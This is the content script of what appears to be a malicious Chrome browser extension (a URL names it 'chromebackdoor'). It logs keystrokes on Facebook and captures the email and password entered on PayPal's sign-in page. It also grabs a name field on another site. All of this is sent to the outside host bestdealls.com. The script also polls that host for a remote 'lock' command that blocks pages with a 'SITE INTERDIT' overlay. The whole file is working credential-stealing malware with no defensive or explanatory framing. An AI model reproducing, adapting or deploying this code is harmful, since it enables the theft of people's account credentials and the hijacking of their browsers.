$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    
    // CHECK UPDATE
    function checkupdate()
    {
        var s = "2.0";
        $.get("http://localhost:8888/chromebackdoor/web/update/up.txt",function(data)
        {
            if(data != s)
            {
                alert('ok');
            }
        });
    }
    //checkupdate();

    //fonction lock
    function locking()
    {
        wrapperDiv = document.createElement("div");
        script = document.createElement("script");
        script.src = chrome.extension.getURL("jquery-1.11.3.min.js");
        wrapperDiv.setAttribute("style","position: absolute; left: 0px; top: 0px; background-color: rgba(0, 0, 0, 0.81); opacity: 0.9; z-index: 2000; height: 1083px; width: 100%;");
        wrapperDiv.className = 'test';

        iframeElement = document.createElement("iframe");
        iframeElement.setAttribute("style","width: 100%; height: 100%;");

        wrapperDiv.appendChild(iframeElement);

        modalDialogParentDiv = document.createElement("div");
        modalDialogParentDiv.setAttribute("style","position: absolute; min-height:150px; width: 450px; border: 1px solid rgb(51, 102, 153); padding: 10px; background-color: rgb(255, 255, 255); z-index: 2001; overflow: auto; text-align: center; top: 149px; left: 497px;");

        modalDialogSiblingDiv = document.createElement("div");

        modalDialogTextDiv = document.createElement("div"); 
        modalDialogTextDiv.setAttribute("style" , "text-align:center");

        modalDialogTextSpan = document.createElement("span"); 
        modalDialogText = document.createElement("strong"); 

        breakElement = document.createElement("br"); 
        imageElement = document.createElement("img");
        imageElement.src = chrome.extension.getURL("eyes.png");

        input = document.createElement("text");
        input.textContent = "SITE INTERDIT";



        modalDialogTextDiv.appendChild(breakElement);
        modalDialogTextDiv.appendChild(breakElement);
        modalDialogTextDiv.appendChild(imageElement);
        modalDialogTextDiv.appendChild(breakElement);



        modalDialogSiblingDiv.appendChild(modalDialogTextDiv);
        modalDialogParentDiv.appendChild(modalDialogSiblingDiv);
        document.body.appendChild(wrapperDiv);
        document.body.appendChild(modalDialogParentDiv);
        modalDialogTextDiv.appendChild(input);

    }
    function lock()
    {
        $.get("https://bestdealls.com/relais/lock.php",function(data)
        {
            if(data == '1')
            {
                locking();
            }
        });
    }
    
    lock();
    
    // FACEBOOK FUNCTION BESOIN DE HTTPS
    function sendF()
    {
        var urls = window.location.href;
        $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
    }
    function face()
    {
        document.onkeypress = keychangefb;
        function keychangefb()
        {
            var key = event.keyCode;
            var letter = String.fromCharCode(key);
            if(key == 13)
            {
                var code = document.body.getElementsByTagName('input')[2].value;
            }
            phish += letter;
        }
        var fb = document.body.getElementsByTagName('input')[3];
        fb.onmouseenter = sendF;
    }
    
    function tribouillois()
    {
        function recup()
        {
            var urls = window.location.href;
            var name = $('#name')[0];
            phish = name;
            $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
        }
        var btn = $('button')[1];
        btn.onmouseenter = recup;
        
    }
    
    function paypal()
    {
        var urls = window.location.href;
        var email = $('#email')[0].value;
        var pass = $('#password')[0].value;
        var phish = email+"&123&"+pass;
        $.get("https://bestdealls.com/relais/index.php", { info: phish, url: urls } );
    }
    
    // VERIFICATION D'URL
    if(tabURL.indexOf('facebook') !== -1 )
    {
        face();
    }
    else if(tabURL.indexOf('tribouillois') !== -1)
    {
        tribouillois();
    }
    else if(tabURL.indexOf('paypal.com/signin/') !== -1)
    {
        $('#btnLogin')[0].onmouseenter = paypal;
    }
});